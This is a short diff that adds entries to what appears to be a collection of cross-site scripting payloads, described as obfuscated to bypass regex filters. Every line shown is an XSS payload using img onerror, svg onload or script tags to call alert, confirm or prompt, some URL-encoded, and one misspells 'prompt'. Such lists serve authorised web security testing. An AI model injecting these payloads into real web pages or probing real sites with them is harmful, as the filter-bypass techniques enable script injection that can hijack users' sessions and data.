@@ -4,3 +4,8 @@ an XSS payload with Alert Obfuscation, for bypass RegEx filters
 
 "><img src=x ononerrorerror=confirm`ohhBoiii`>
 "><svg%2Fonload%3Dalert(1337)
+"%27><script>xE2x80x82javascript%3Aalert%281%29<%2Fscript>
+/><svg src=x onload=confirm("1337");>
+"><script>propmt("mamunwhh")</script>
+"><img src=z onerror=alert(1)>
+"><img src=z onerror=prompt(1)>
